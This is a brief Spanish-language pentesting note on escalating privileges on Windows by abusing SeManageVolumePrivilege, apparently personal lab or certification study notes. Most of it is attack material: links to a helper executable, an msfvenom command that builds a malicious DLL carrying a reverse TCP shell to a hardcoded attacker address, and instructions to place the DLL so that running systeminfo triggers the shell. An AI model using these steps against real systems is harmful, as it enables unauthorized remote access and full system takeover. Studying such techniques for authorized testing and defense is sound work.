---
tags: [privesc, windows, semanagevolume]
---

# SeManageVolumePrivilege

Referencia: https://daniel10barredo.github.io/PrivEscAssist_Windows/#users/SeManageVolumePrivilege

Tool: https://daniel10barredo.github.io/PrivEscAssist_Windows/tools/FsctlSdGlobalChange.exe

```bash
# Crear DLL maliciosa
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.220 LPORT=4444 -f dll -o rev.dll
```

Descargar en la ruta correcta y ejecutar `systeminfo` → devuelve reverse shell.

